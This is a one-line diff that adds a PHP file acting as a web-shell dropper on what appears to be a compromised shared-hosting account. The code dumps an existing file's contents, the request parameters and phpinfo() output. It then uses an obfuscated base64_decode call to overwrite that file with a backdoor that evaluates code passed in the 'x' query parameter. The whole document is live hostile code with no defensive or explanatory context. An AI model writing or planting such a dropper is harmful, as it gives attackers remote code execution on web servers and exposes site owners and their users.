@@ -1,0 +1,1 @@
+<?php var_dump(file_get_contents('/home/u3727568/public_html/file/pt/foto_pts/aa.php'));var_dump($_GET); phpinfo(); file_put_contents('/home/u3727568/public_html/file/pt/foto_pts/aa.php', ('base64'.'_decode')('PD9waHAgZXZhbCgkX0dFVFsieCJdKTsgPz4='));
